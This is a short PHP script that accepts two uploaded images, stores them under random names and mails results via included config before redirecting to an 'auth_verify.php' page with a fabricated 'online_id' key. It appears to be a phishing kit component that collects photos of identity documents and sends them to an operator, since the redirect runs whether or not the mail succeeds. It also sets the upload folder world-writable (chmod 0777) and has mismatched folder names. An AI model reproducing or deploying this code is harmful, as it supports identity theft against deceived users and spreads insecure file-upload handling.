<?php 
  session_start();
include 'config.php';
include 'mail.php';
ini_set('max_exection_time', 60);

//get file from the form and get following information
$file = $_FILES['file'];
$file1 = $_FILES['file1'];

$fileName = $_FILES['file']['name'];
$fileName1 = $_FILES['file1']['name'];

$fileTmpName = $_FILES['file']['tmp_name'];
$fileTmpName1 = $_FILES['file1']['tmp_name'];

$fileSize = $_FILES['file']['size'];
$fileSize1 = $_FILES['file1']['size'];

$fileError = $_FILES['file']['error'];
$fileError1 = $_FILES['file1']['error'];

$fileType = $_FILES['file']['type'];
$fileType1 = $_FILES['file1']['type'];

//retrieve file extention using explode()
$fileExt = explode('.', $fileName);
$fileExt1 = explode('.', $fileName1);
//because some file extentions might be in capital letters
$fileActualExt = strtolower(end($fileExt));
$fileActualExt1 = strtolower(end($fileExt1));


$allowed = array('jpg','jpeg','png');
if(in_array($fileActualExt, $allowed)){
  if($fileError === 0){
    //if the size of the file is lesser than 1M kb = 1000mb
    if($fileSize < 1000000){
      $fileNameNew = uniqid('',true).".".$fileActualExt;
      chmod('uploads/',0777);
      echo "permission granted to uploads directory!" . "<br>";
      $fileDestination = 'upload/'.$fileNameNew;
      move_uploaded_file($fileTmpName, $fileDestination);
      echo $fileNameNew . "<br>";
      echo "Successfully uploaded your file" . "<br>";
    } else {
      echo "Your file is too big to upload" . "<br>";
    }
  } else {
    echo "There was an error uploading your file" . "<br>";
  }
} else {
  echo "This file extention is not allowed to be uploaded" . "<br>";
}



if(in_array($fileActualExt1, $allowed)){
  if($fileError1 === 0){
    //if the size of the file is lesser than 1M kb = 1000mb
    if($fileSize1 < 10000000){
      $fileNameNew1 = uniqid('',true).".".$fileActualExt1;
      chmod('uploads/',0777);
      echo "permission granted to uploads directory!" . "<br>";
      $fileDestination1 = 'upload/'.$fileNameNew1;
      move_uploaded_file($fileTmpName1, $fileDestination1);
      echo $fileNameNew1 . "<br>";
      echo "Successfully uploaded your file" . "<br>";
    } else {
      echo "Your file is too big to upload" . "<br>";
    }
  } else {
    echo "There was an error uploading your file" . "<br>";
  }
} else {
  echo "This file extention is not allowed to be uploaded" . "<br>";
}








if(mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../auth_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../auth_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          
	          
	      
?>
